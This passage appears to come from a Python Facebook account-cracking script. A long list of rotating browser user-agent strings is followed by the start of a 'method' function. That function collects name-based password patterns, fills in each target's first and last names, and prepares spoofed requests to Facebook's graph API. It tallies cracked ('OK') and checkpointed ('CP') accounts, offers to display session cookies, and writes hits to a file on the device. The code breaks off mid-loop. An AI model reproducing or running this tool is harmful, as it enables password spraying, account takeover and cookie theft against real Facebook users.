Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/34.0.815.0 Safari/531.0.0
Mozilla/5.0 (Windows NT 6.0; rv:6.9) Gecko/20100101 Firefox/6.9.0
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:11.4) Gecko/20100101 Firefox/11.4.9
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:8.5) Gecko/20100101 Firefox/8.5.1
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:13.6) Gecko/20100101 Firefox/13.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)  AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/26.0.818.0 Safari/535.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6 rv:4.0; IS) AppleWebKit/535.0.1 (KHTML, like Gecko) Version/5.0.2 Safari/535.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/34.0.864.0 Safari/536.0.2
Mozilla/5.0 (Windows NT 5.0; rv:9.9) Gecko/20100101 Firefox/9.9.1
Opera/11.65 (Windows NT 6.1; U; MT Presto/2.9.169 Version/11.00)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/27.0.895.0 Safari/533.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/28.0.868.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/17.0.857.0 Safari/532.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.2; rv:8.4) Gecko/20100101 Firefox/8.4.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_6 rv:2.0; RM) AppleWebKit/531.2.1 (KHTML, like Gecko) Version/5.0.1 Safari/531.2.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:12.1) Gecko/20100101 Firefox/12.1.8
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/15.0.881.0 Safari/538.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/20.0.890.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/31.0.847.0 Safari/534.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_6)  AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/15.0.817.0 Safari/533.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/14.0.828.0 Safari/531.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/17.0.844.0 Safari/533.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/37.0.845.0 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/535.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/30.0.842.0 Safari/537.0.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:7.8) Gecko/20100101 Firefox/7.8.7
Opera/11.29 (Windows NT 5.2; U; CY Presto/2.9.168 Version/10.00)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/3.1; .NET CLR 1.3.82700.1)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/5.1; .NET CLR 4.9.53595.1)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/5.1; .NET CLR 2.1.73397.9)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/30.0.855.0 Safari/537.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/17.0.891.0 Safari/536.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/21.0.815.0 Safari/531.0.0
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:14.6) Gecko/20100101 Firefox/14.6.3
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.1; .NET CLR 1.2.19335.5)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/32.0.882.0 Safari/535.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/27.0.880.0 Safari/535.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/24.0.862.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/28.0.888.0 Safari/538.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/20.0.843.0 Safari/535.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/29.0.813.0 Safari/533.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/22.0.818.0 Safari/533.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.8; rv:13.9) Gecko/20100101 Firefox/13.9.4
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/6.1; .NET CLR 4.1.93833.7)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/33.0.859.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/23.0.889.0 Safari/533.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/34.0.818.0 Safari/535.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/15.0.850.0 Safari/537.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/32.0.822.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/31.0.823.0 Safari/537.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/37.0.841.0 Safari/537.1.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:14.1) Gecko/20100101 Firefox/14.1.4
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:4.0; HE) AppleWebKit/535.1.0 (KHTML, like Gecko) Version/4.1.9 Safari/535.1.0
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_9)  AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/27.0.851.0 Safari/532.0.2
Mozilla/5.0 (Windows NT 5.1; rv:10.6) Gecko/20100101 Firefox/10.6.7
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/14.0.855.0 Safari/532.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/22.0.862.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/34.0.888.0 Safari/534.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.0; rv:7.1) Gecko/20100101 Firefox/7.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/29.0.803.0 Safari/536.0.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; .NET CLR 3.5.77542.2)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_2 rv:3.0; FJ) AppleWebKit/536.1.1 (KHTML, like Gecko) Version/4.0.9 Safari/536.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/16.0.893.0 Safari/537.2.2
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:11.4) Gecko/20100101 Firefox/11.4.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:6.0; SE) AppleWebKit/537.2.0 (KHTML, like Gecko) Version/6.0.8 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/39.0.866.0 Safari/535.2.1
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:9.2) Gecko/20100101 Firefox/9.2.2
Opera/12.38 (Windows NT 6.1; U; CU Presto/2.9.163 Version/10.00)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4)  AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/15.0.803.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/15.0.863.0 Safari/535.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/31.0.870.0 Safari/537.0.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.7) Gecko/20100101 Firefox/10.7.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1 rv:6.0; RU) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/4.0.5 Safari/531.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_4 rv:5.0; AF) AppleWebKit/534.1.2 (KHTML, like Gecko) Version/4.0.5 Safari/534.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_8 rv:6.0; BG) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/6.0.5 Safari/534.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4)  AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/39.0.827.0 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/21.0.827.0 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/13.0.820.0 Safari/531.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/17.0.830.0 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/18.0.890.0 Safari/531.1.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; .NET CLR 4.1.35246.4)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_3)  AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/29.0.885.0 Safari/532.1.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/6.1; .NET CLR 3.6.22711.7)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/19.0.820.0 Safari/534.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/30.0.880.0 Safari/534.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/37.0.808.0 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/15.0.875.0 Safari/538.0.2
Mozilla/5.0 (Windows NT 6.0; rv:5.8) Gecko/20100101 Firefox/5.8.9
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/33.0.859.0 Safari/535.0.2
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:6.7) Gecko/20100101 Firefox/6.7.0
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.7) Gecko/20100101 Firefox/5.7.9
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:8.8) Gecko/20100101 Firefox/8.8.6
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/23.0.877.0 Safari/538.2.2
Mozilla/5.0 (Windows NT 6.2; rv:14.9) Gecko/20100101 Firefox/14.9.9
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/32.0.866.0 Safari/531.0.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:4.0; LI) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/4.1.3 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/31.0.834.0 Safari/537.2.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.8) Gecko/20100101 Firefox/10.8.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.1; .NET CLR 1.1.19394.2)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/36.0.867.0 Safari/538.1.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/7.0; .NET CLR 2.6.22301.9)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/31.0.848.0 Safari/534.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/39.0.828.0 Safari/532.2.1
Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8)  AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/39.0.849.0 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/24.0.871.0 Safari/535.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/18.0.873.0 Safari/537.1.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.1; .NET CLR 3.2.75463.6)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8 rv:6.0; LI) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/7.0.2 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/13.0.800.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/26.0.872.0 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/17.0.810.0 Safari/531.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1 rv:3.0; KW) AppleWebKit/536.0.0 (KHTML, like Gecko) Version/5.1.3 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/31.0.885.0 Safari/533.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/19.0.834.0 Safari/531.2.0
Mozilla/5.0 (Windows NT 5.2; rv:12.8) Gecko/20100101 Firefox/12.8.5
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/17.0.801.0 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/26.0.841.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/15.0.874.0 Safari/532.0.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_4 rv:2.0; BS) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/4.1.7 Safari/534.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/14.0.819.0 Safari/534.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_5)  AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/18.0.815.0 Safari/534.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/27.0.822.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/24.0.883.0 Safari/533.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/6.0; .NET CLR 1.0.50385.9)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/38.0.826.0 Safari/535.1.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8)  AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/33.0.858.0 Safari/538.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/534.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2 rv:4.0; BE) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/4.0.8 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/30.0.867.0 Safari/531.0.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:10.0) Gecko/20100101 Firefox/10.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/23.0.824.0 Safari/534.0.1
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.4) Gecko/20100101 Firefox/5.4.4
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/25.0.833.0 Safari/532.0.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.7.41140.7)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/18.0.824.0 Safari/532.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/31.0.819.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/16.0.844.0 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/19.0.877.0 Safari/537.1.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6 rv:4.0; FJ) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/7.1.5 Safari/531.1.2
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:12.6) Gecko/20100101 Firefox/12.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/28.0.803.0 Safari/536.1.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6 rv:6.0; KA) AppleWebKit/535.1.0 (KHTML, like Gecko) Version/5.1.7 Safari/535.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)  AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/17.0.892.0 Safari/532.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6 rv:5.0; GA) AppleWebKit/534.2.0 (KHTML, like Gecko) Version/4.1.7 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/13.0.818.0 Safari/533.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/19.0.814.0 Safari/538.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_6)  AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/38.0.883.0 Safari/538.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0 rv:4.0; NN) AppleWebKit/538.1.1 (KHTML, like Gecko) Version/6.0.10 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/18.0.892.0 Safari/532.1.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/6.0; .NET CLR 1.2.87477.7)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/13.0.860.0 Safari/535.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.5; rv:8.6) Gecko/20100101 Firefox/8.6.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/21.0.898.0 Safari/537.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/35.0.866.0 Safari/538.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/14.0.888.0 Safari/535.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/31.0.884.0 Safari/538.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6)  AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/28.0.880.0 Safari/535.1.0
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_7_3 rv:4.0; FA) AppleWebKit/532.2.2 (KHTML, like Gecko) Version/4.0.10 Safari/532.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/29.0.817.0 Safari/533.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_0 rv:3.0; GA) AppleWebKit/537.0.1 (KHTML, like Gecko) Version/6.0.9 Safari/537.0.1
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:9.2) Gecko/20100101 Firefox/9.2.8
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/5.0; .NET CLR 2.5.88801.6)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9 rv:4.0; AB) AppleWebKit/536.0.2 (KHTML, like Gecko) Version/4.1.4 Safari/536.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/15.0.884.0 Safari/537.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/37.0.806.0 Safari/533.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/37.0.841.0 Safari/537.1.0
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:8.5) Gecko/20100101 Firefox/8.5.7
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0; .NET CLR 1.1.80295.9)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/31.0.811.0 Safari/536.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/24.0.886.0 Safari/536.2.1
Mozilla/5.0 (Windows NT 5.0; rv:9.2) Gecko/20100101 Firefox/9.2.5
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/31.0.828.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/18.0.861.0 Safari/531.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/534.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/38.0.840.0 Safari/538.0.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/6.1; .NET CLR 4.7.42268.0)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/19.0.850.0 Safari/536.0.2
Opera/10.60 (Windows NT 6.2; U; CO Presto/2.9.186 Version/11.00)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/15.0.896.0 Safari/533.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_1 rv:5.0; LN) AppleWebKit/536.2.0 (KHTML, like Gecko) Version/6.0.5 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/22.0.856.0 Safari/534.2.1
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:11.9) Gecko/20100101 Firefox/11.9.3
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/20.0.894.0 Safari/537.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_6 rv:6.0; EU) AppleWebKit/538.1.0 (KHTML, like Gecko) Version/6.0.4 Safari/538.1.0
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/7.1; .NET CLR 4.1.80836.3)
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:8.7) Gecko/20100101 Firefox/8.7.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/6.1; .NET CLR 1.3.30105.9)
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
